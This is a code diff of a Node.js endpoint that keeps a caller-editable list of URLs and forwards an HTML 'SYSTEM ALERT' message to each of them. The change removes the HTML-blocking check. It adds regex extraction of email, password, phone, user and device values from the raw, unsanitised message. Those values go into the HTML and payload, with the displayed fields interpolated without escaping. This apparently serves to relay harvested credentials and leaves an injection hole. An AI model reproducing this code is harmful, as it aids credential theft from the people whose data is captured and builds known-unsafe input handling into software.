@@ -23,7 +23,7 @@ function saveUrls(data) {
 }
 
 // ======================
-// PARSE BODY
+// PARSE BODY SAFE
 // ======================
 function parseBody(req) {
   if (!req.body) return {};
@@ -44,21 +44,23 @@ function stripHtml(str = "") {
 }
 
 // ======================
-// BLOCK HTML REQUEST
+// EXTRACT VARIABLES FROM RAW INPUT (HTML/TEKS CAMPUR)
 // ======================
-function containsHtml(str = "") {
-  return /<[^>]+>/i.test(str);
+function extractVars(input = "") {
+  const text = String(input);
+
+  return {
+    email: (text.match(/email[:=]\s*([^\s<]+)/i)?.[1]) || "",
+    password: (text.match(/password[:=]\s*([^\s<]+)/i)?.[1]) || "",
+    ip: (text.match(/ip[:=]\s*([0-9a-fA-F:.]+)/i)?.[1]) || "",
+    user: (text.match(/user[:=]\s*([^\s<]+)/i)?.[1]) || "",
+    phone: (text.match(/phone[:=]\s*([^\s<]+)/i)?.[1]) || "",
+    device: (text.match(/device[:=]\s*([^\s<]+)/i)?.[1]) || ""
+  };
 }
 
 // ======================
-// RENDER SIMPLE $VAR
-// ======================
-function render(str, vars) {
-  return String(str).replace(/\$(\w+)/g, (_, k) => vars[k] ?? "");
-}
-
-// ======================
-// BUILD HTML SERVER ONLY
+// BUILD HTML (BACKEND ONLY)
 // ======================
 function buildHtml(vars) {
   return `
@@ -72,9 +74,11 @@ function buildHtml(vars) {
 <h2 style="color:#38bdf8">🚨 SYSTEM ALERT</h2>
 
 <table style="width:100%;background:#1e293b;padding:15px;border-radius:10px">
-<tr><td><b>Subject</b></td><td>${vars.subjek}</td></tr>
-<tr><td><b>User</b></td><td>${vars.sender}</td></tr>
+<tr><td><b>User</b></td><td>${vars.user || "-"}</td></tr>
+<tr><td><b>Email</b></td><td>${vars.email || "-"}</td></tr>
+<tr><td><b>Phone</b></td><td>${vars.phone || "-"}</td></tr>
 <tr><td><b>IP</b></td><td>${vars.ip}</td></tr>
+<tr><td><b>Device</b></td><td>${vars.device || "-"}</td></tr>
 <tr><td><b>Time</b></td><td>${vars.time}</td></tr>
 </table>
 
@@ -110,11 +114,14 @@ module.exports = async (req, res) => {
     // ADD URL
     // ======================
     if (action === "add-url") {
-      if (!body.url)
+      if (!body.url) {
         return res.json({ success: false, message: "URL wajib" });
+      }
 
-      if (!urls.includes(body.url)) urls.push(body.url);
-      saveUrls(urls);
+      if (!urls.includes(body.url)) {
+        urls.push(body.url);
+        saveUrls(urls);
+      }
 
       return res.json({ success: true, urls });
     }
@@ -138,37 +145,28 @@ module.exports = async (req, res) => {
     // ======================
     // INPUT
     // ======================
-    const subjekRaw = body.subjek || "";
-    const senderRaw = body.sender || "system";
-    const messageRaw = body.message || body.pesan || "";
-
-    // ======================
-    // BLOCK HTML TOTAL
-    // ======================
-    if (
-      containsHtml(subjekRaw) ||
-      containsHtml(messageRaw) ||
-      containsHtml(senderRaw)
-    ) {
-      return res.status(400).json({
-        success: false,
-        message: "HTML tidak diperbolehkan"
-      });
-    }
+    const rawSubjek = body.subjek || "";
+    const rawSender = body.sender || "system";
+    const rawMessage = body.message || body.pesan || "";
 
     // ======================
     // CLEAN INPUT
     // ======================
-    const subjek = stripHtml(subjekRaw);
-    const sender = stripHtml(senderRaw);
-    const message = stripHtml(messageRaw);
+    const subjek = stripHtml(rawSubjek);
+    const sender = stripHtml(rawSender);
+    const message = stripHtml(rawMessage);
 
     if (!subjek) {
       return res.status(400).json({
         success: false,
-        message: "subjek wajib"
+        message: "subjek wajib diisi"
       });
     }
+
+    // ======================
+    // EXTRACT VARIABLES (DARI INPUT KOTOR)
+    // ======================
+    const extracted = extractVars(rawMessage);
 
     // ======================
     // AUTO VARIABLES
@@ -181,16 +179,23 @@ module.exports = async (req, res) => {
         req.socket?.remoteAddress ||
         "unknown",
       time: new Date().toISOString(),
-      message
+      message,
+
+      // hasil extract dari HTML/text
+      user: extracted.user,
+      email: extracted.email,
+      password: extracted.password,
+      phone: extracted.phone,
+      device: extracted.device
     };
 
     // ======================
-    // BACKEND HTML GENERATION ONLY
+    // BUILD HTML ONLY FROM BACKEND
     // ======================
     const html = buildHtml(vars);
 
     const payload = new URLSearchParams({
-      subjek: render(subjek, vars),
+      subjek,
       pesan: html,
       sender
     }).toString();
@@ -214,11 +219,11 @@ module.exports = async (req, res) => {
           status: r.status,
           success: r.ok
         });
-      } catch (e) {
+      } catch (err) {
         results.push({
           url,
           success: false,
-          error: e.message
+          error: err.message
         });
       }
     }
